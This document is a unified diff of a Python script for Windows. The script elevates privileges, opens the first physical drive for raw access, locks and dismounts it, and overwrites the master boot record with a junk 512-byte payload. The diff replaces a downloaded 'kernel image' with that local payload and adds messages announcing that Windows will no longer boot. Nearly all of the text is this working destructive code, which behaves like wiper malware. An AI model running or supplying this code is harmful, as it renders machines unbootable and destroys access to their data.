@@ -2,7 +2,7 @@ import tkinter as tk
 import os
 import ctypes
 import sys
-import urllib.request
+import ssl
 from ctypes import wintypes
 
 # Requires: pip install pywin32
@@ -27,7 +27,6 @@ def elevate():
     )
 
 def enable_debug_privilege():
-    """Programmatically grants the script permission to bypass disk filters."""
     try:
         hToken = win32security.OpenProcessToken(
             win32api.GetCurrentProcess(), 
@@ -45,24 +44,17 @@ if sys.platform == "win32":
         sys.exit()
 
 def run():
-    # 1. Enable Debug Privileges
+    # 1. Enable permissions
     enable_debug_privilege()
 
-    # 2. Download the kernel image
-    kernel_url = "https://example.com/your_kernel.img"
-    print("Downloading kernel image...")
-    try:
-        with urllib.request.urlopen(kernel_url) as response:
-            kernel_data = response.read()
-        print(f"Downloaded {len(kernel_data)} bytes.")
-    except Exception as e:
-        print(f"Download failed: {e}")
-        return
+    # 2. LOCAL PAYLOAD (Replacing the download)
+    # This is a 512-byte block of 'A's ending with the boot signature 55 AA
+    payload = b"A" * 510 + b"\x55\xAA"
+    print("Using local 512-byte payload...")
 
     # 3. Setup Kernel32 Bridge
     dll = type('DLL', (), {})()
     dll.Kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
-
     dll.Kernel32.CreateFileW.argtypes = [wintypes.LPCWSTR, wintypes.DWORD, wintypes.DWORD, wintypes.LPVOID, wintypes.DWORD, wintypes.DWORD, wintypes.HANDLE]
     dll.Kernel32.CreateFileW.restype = wintypes.HANDLE
     dll.Kernel32.WriteFile.argtypes = [wintypes.HANDLE, ctypes.c_void_p, wintypes.DWORD, ctypes.POINTER(wintypes.DWORD), ctypes.c_void_p]
@@ -70,24 +62,24 @@ def run():
     dll.Kernel32.DeviceIoControl.argtypes = [wintypes.HANDLE, wintypes.DWORD, wintypes.LPVOID, wintypes.DWORD, wintypes.LPVOID, wintypes.DWORD, ctypes.POINTER(wintypes.DWORD), wintypes.LPVOID]
     dll.Kernel32.DeviceIoControl.restype = wintypes.BOOL
 
-    # 4. Open Drive with the Win32 Device Namespace (\\?\)
-    # This bypasses standard Win32 path filtering that often causes Error 5
+    # 4. Open Drive
     hDevice = dll.Kernel32.CreateFileW(r'\\?\PhysicalDrive0', 0x40000000, 0x01 | 0x02, None, 3, 0, 0)
 
     if hDevice != wintypes.HANDLE(-1).value:
-        # 5. Lock and Dismount
+        # 5. Force Dismount
         dwBytesReturned = wintypes.DWORD(0)
         dll.Kernel32.DeviceIoControl(hDevice, 0x00090018, None, 0, None, 0, ctypes.byref(dwBytesReturned), None)
         dll.Kernel32.DeviceIoControl(hDevice, 0x00090020, None, 0, None, 0, ctypes.byref(dwBytesReturned), None)
         
-        print("Attempting raw write...")
+        print("Drive locked. Overwriting MBR...")
 
-        # 6. Perform the Write
+        # 6. Write
         written = wintypes.DWORD(0)
-        success = dll.Kernel32.WriteFile(hDevice, kernel_data, len(kernel_data), ctypes.byref(written), None)
+        success = dll.Kernel32.WriteFile(hDevice, payload, len(payload), ctypes.byref(written), None)
         
         if success:
-            print(f"Success! Wrote {written.value} bytes. The Windows bootloader is gone.")
+            print(f"SUCCESS! Wrote {written.value} bytes to Sector 0.")
+            print("Windows will no longer boot. Restart VM to verify.")
         else:
             print(f"Write failed. Error: {ctypes.get_last_error()}")
             
